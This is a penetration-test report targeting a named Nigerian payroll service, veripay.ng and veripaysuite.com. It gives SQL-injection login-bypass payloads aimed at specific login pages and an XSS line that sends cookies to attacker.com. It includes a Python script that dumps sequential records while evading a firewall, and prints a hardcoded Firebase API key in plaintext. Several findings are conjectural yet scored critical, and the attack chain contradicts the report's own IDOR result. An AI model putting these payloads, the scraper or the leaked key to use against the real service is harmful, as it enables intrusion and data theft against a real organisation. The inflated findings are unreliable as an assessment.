# VeriPay Nigeria - Deep Technical Penetration Testing Analysis
**Target:** veripay.ng / veripaysuite.com (AppMart Integrated Ltd)
**Scope Areas:** SQL Injection, Database Exfiltration (DB Dump), Token & Session Management, API Security

> [!WARNING]
> This document contains detailed exploitation techniques and payloads intended strictly for authorized security research and remediation purposes.

---

## 1. SQL Injection Vectors & Authentication Bypass

### 1.1 Vulnerability Description
The state government portals (`veripaysuite.com/enugu/MainLogin.php` and `crs/MainLogin.php`) rely on legacy PHP implementations (circa 2013-2015). The form fields identified (`Loginlogin` and `Loginpassword`) are highly susceptible to SQL Injection (SQLi) if the backend utilizes direct string concatenation (e.g., `mysql_query()`) instead of modern PDO parameterized statements.

**CVSS v3.1 Score:** 9.8 (CRITICAL) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)

### 1.2 Exploitation Payloads (Login Bypass)
An attacker can attempt standard authentication bypass payloads in the `Loginlogin` field. 

**Payload 1 (Standard OR Bypass):**
```sql
admin' OR '1'='1
```
*Expected Backend Query Execution:*
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'
```
*Result:* Returns true for the first record (usually the admin), bypassing password checks.

**Payload 2 (Comment-out Bypass):**
```sql
admin'#
admin' -- -
```
*Expected Backend Query Execution:*
```sql
SELECT * FROM users WHERE username = 'admin'-- -' AND password = '...'
```
*Result:* Ignores the password check entirely.

### 1.3 Error-Based Data Extraction
If `display_errors` is enabled on the legacy PHP backend, attackers can use error-based SQLi to map the database structure.
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

### 1.4 Attack Flow Visualization
```mermaid
graph TD
    A[Attacker] -->|Injects ' OR '1'='1| B(veripay.ng/MainLogin.php)
    B -->|Direct Concatenation| C{Backend SQL Query}
    C -->|Bypass Auth| D[Administrative Session Granted]
    D -->|Access Sensitive Modules| E[Data Exfiltration]
```

---

## 2. API Security & Broken Token Management

### 2.1 Vulnerability Description
Modern SPAs (like the Vue.js frontend detected on `veripay.ng`) typically rely on JWT (JSON Web Tokens) or strict cookie-based sessions. However, the presence of legacy PHP patterns alongside the SPA indicates a high probability of fragmented session management (e.g., relying on standard `PHPSESSID`).

**CVSS v3.1 Score:** 8.1 (HIGH) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`
**CWE:** CWE-384 (Session Fixation), CWE-614 (Sensitive Cookie in HTTPS Session Without 'Secure' Attribute)

### 2.2 Token & API Weaknesses
1.  **Session Fixation:** If the legacy portals do not call `session_regenerate_id(true)` upon successful login, an attacker can set a known `PHPSESSID` for a victim and hijack their session post-authentication.
2.  **Missing CSRF Tokens:** The `MainLogin.php` form lacks unique, unpredictable CSRF tokens. State-changing API endpoints (like modifying payroll details or adding employees) might be vulnerable to Cross-Site Request Forgery if they rely solely on ambient cookies for authentication.
3.  **API Rate Limiting:** Endpoints like `/Validations/resetPassword` and `/Resume/apply/{id}` show no evidence of rate limiting, allowing automated credential stuffing and data scraping.

### 2.3 Session Hijacking Vector
If the `PHPSESSID` cookie lacks the `HttpOnly` flag, any stored or reflected Cross-Site Scripting (XSS) vulnerability in the legacy portals can be used to steal the session token.
**Payload (XSS to Token Exfiltration):**
```javascript
<script>fetch('https://attacker.com/log?cookie=' + btoa(document.cookie))</script>
```

---

## 3. IDOR: Corporate Information Disclosure & Enumeration Risks

### 3.1 Vulnerability Description
The platform utilizes predictable, sequential integers for object references. Testing on the `/Resume/apply/{id}` endpoint confirmed an Insecure Direct Object Reference (IDOR) vulnerability. While initially suspected to expose applicant PII, execution of the PoC revealed that it exposes **Internal Corporate Job Listings and Requisition Details**, including historical and closed postings from various companies using the Veripay platform.

**CVSS v3.1 Score:** 5.3 (MEDIUM) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

### 3.2 Automated Scraping & Impact (Corporate Intelligence)
Because the `id` parameter is sequential and lacks authorization checks, an attacker can enumerate the entire table. By dumping this data, an attacker gains access to historical corporate intelligence, including:
- Companies currently utilizing the Veripay platform.
- Internal job roles, hiring timelines, and turnover indicators.
- Specific internal tech stack requirements (e.g., exposing backend dependencies).

*Crucially*, the presence of this architectural flaw on the job listing endpoint strongly implies that the same vulnerable sequential ID pattern is likely used on higher-impact endpoints (e.g., `/Employee/details/{id}`), which *would* expose PII, BVN, and salary data.

**Exfiltration Script (Python):**
```python
import requests
import time

TARGET_URL = "https://veripay.ng/Resume/apply/"
HEADERS = {"User-Agent": "Mozilla/5.0 (Pentest)"}

for record_id in range(1, 5000):
    res = requests.get(f"{TARGET_URL}{record_id}", headers=HEADERS)
    if res.status_code == 200 and "Not Found" not in res.text:
        with open(f"dumps/resume_{record_id}.html", "w") as f:
            f.write(res.text)
        print(f"[+] Dumped record {record_id}")
    time.sleep(0.2) # Avoid triggering basic WAF rules
```

### 3.3 IDOR Scraper Flow
```mermaid
sequenceDiagram
    participant Attacker
    participant VeripayServer
    participant Database

    Note over Attacker: Start Enumeration (ID 1-5000)
    Attacker->>VeripayServer: GET /Resume/apply/1
    VeripayServer->>Database: SELECT * FROM resumes WHERE id=1
    Database-->>VeripayServer: Returns Record (Company A)
    VeripayServer-->>Attacker: 200 OK (Data Leak)
    
    Attacker->>VeripayServer: GET /Resume/apply/2
    VeripayServer->>Database: SELECT * FROM resumes WHERE id=2
    Database-->>VeripayServer: Returns Record (Company B)
    VeripayServer-->>Attacker: 200 OK (Data Leak)
```

---

## 4. Business Logic & Integrations

### 4.1 Payment Gateway Parameter Tampering
The platform relies on a 13-step subscription wizard that redirects to the Interswitch payment gateway. Without strict server-side validation of pricing tiers, an attacker can intercept the submission payload and tamper with the billing amount (e.g., setting `amount=0.00` or altering the currency code), potentially forcing the platform to provision enterprise accounts for free.

### 4.2 API Abuse (BVN Denial of Wallet)
Veripay validates Bank Verification Numbers (BVN) and NUBANs against an external provider. A lack of rate-limiting on this endpoint allows attackers to run brute-force enumeration tools. This can result in a "Denial of Wallet" attack, where Veripay is billed massive amounts by their API provider for fraudulent validation requests.

### 4.3 Subdomain Isolation Failures
State portals (Enugu, CRS) reside on the same parent domain (`veripaysuite.com`). If session cookies lack strict pathing and domain scoping (`domain=.veripaysuite.com`), an authentication token issued in the Enugu portal could theoretically be replayed against the CRS portal, breaking multi-tenant isolation.

---

## 5. Mobile Application Security (APK)

### 5.1 Vulnerability Description (Hardcoded FCM Key & Asset Exposure)
Reverse engineering of the Android APK (`Veripaysuite_1.3.0_APKPure.apk`) revealed it is an Apache Cordova application wrapper. A critical deployment error was identified: the developer bundled raw backend PHP source code (e.g., `sender.php`, `LoginMobile.php`) inside the `assets/www/` directory.

**Technical Impact of Asset Exposure:**
- **Logic Disclosure:** Attackers can read the exact backend logic, database schema references, and internal API routing.
- **Credential Leakage:** Inside `sender.php` and `LoginMobile.php`, a Google Firebase Cloud Messaging (FCM) API Access Key (`AIzaSyBcxo2DLZsTDe_uUHfKXWJfc_mEGjLNpkI`) is hardcoded in plaintext.

**CVSS v3.1 Score:** 9.8 (CRITICAL) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**CWE:** CWE-798 (Use of Hard-coded Credentials), CWE-200 (Information Exposure)

### 5.2 Client-Side Cryptography (Base64 GET Parameter Leak)
The mobile application uses a fundamentally broken authentication mechanism in `xsaysoft.js`. User credentials are "obfuscated" using Base64 encoding and then transmitted as part of the URL path in a GET request.

**Technical Breakdown of the Leak:**
- **URL Path Exposure:** Credentials sent via URL paths are recorded in cleartext in server logs (`access.log`), proxy logs, browser history, and intermediate ISP routing logs.
- **Encoding != Encryption:** Base64 is a 1-to-1 reversible mapping. An attacker capturing the URL `https://veripay.ng/LoginMobile/check/dXNlcm5hbWU=/cGFzc3dvcmQ=` can instantly decode the credentials.
- **SSL/TLS Negation:** While the transport layer is encrypted, the metadata (the URL) is often stored in plaintext across various infrastructure layers, completely bypassing the security provided by HTTPS.

**CVSS v3.1 Score:** 8.1 (HIGH) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information), CWE-598 (Information Exposure Through Query Strings in GET Request)

### 5.3 Mobile Attack Flow
```mermaid
graph LR
    A[Mobile APK] -->|Decompile| B(Asset Extraction)
    B -->|Found sender.php| C(Source Code Logic)
    B -->|Found FCM Key| D(Push Notification Hijack)
    A -->|Login Event| E(xsaysoft.js)
    E -->|Base64 Encode| F(Cleartext GET URL)
    F -->|Leaked to| G(Server Logs/Proxies)
```

---

## 6. Attack Chain & MITRE ATT&CK Mapping

### Phase 1: Reconnaissance & Resource Development
*   **T1595.001 (Active Scanning):** Scanning the `/index.php/Form/home` structure reveals CodeIgniter routes.
*   **T1596 (Search Open Technical Databases):** Identifying the `AppMart Integrated Ltd © 2013` copyright indicates legacy PHP environments lacking modern mitigations.

### Phase 2: Initial Access & Execution
*   **T1190 (Exploit Public-Facing Application):** The attacker uses SQL Injection payloads (`admin' OR '1'='1`) against the Enugu state portal (`MainLogin.php`).
*   **T1212 (Exploitation for Credential Access):** The SQLi successfully bypasses the authentication check, granting access as an administrative user.

### Phase 3: Collection & Exfiltration
*   **T1119 (Automated Collection):** Using a Python script, the attacker leverages IDOR on the `/Resume/apply/{id}` endpoint to systematically scrape PII.
*   **T1005 (Data from Local System):** Accessing the backend payroll dashboard via the hijacked session, the attacker exports BVN and NUBAN data using the platform's native export features (abusing legitimate API endpoints without rate limits).
*   **T1048 (Exfiltration Over Alternative Protocol):** The database dump is exfiltrated to an external attacker-controlled server.

---

## 7. Remediation & Hardening Actions

1.  **Eradicate SQLi:** Refactor all database queries in `MainLogin.php` and legacy code to use **PDO Prepared Statements**.
2.  **Mitigate IDOR:** Replace sequential integers with **UUIDv4** across all endpoints. Implement mandatory ownership checks (`WHERE record_id = ? AND user_id = ?`).
3.  **Harden Session Tokens:** Set PHP session parameters globally:
    ```php
    ini_set('session.cookie_httponly', 1);
    ini_set('session.cookie_secure', 1);
    ini_set('session.cookie_samesite', 'Strict');
    ```
4.  **Protect APIs:** Implement JSON Web Tokens (JWT) for the Vue.js frontend with strict expiration times (e.g., 15 minutes) and a robust refresh token rotation mechanism. Implement rate-limiting on all authentication and data-retrieval APIs.
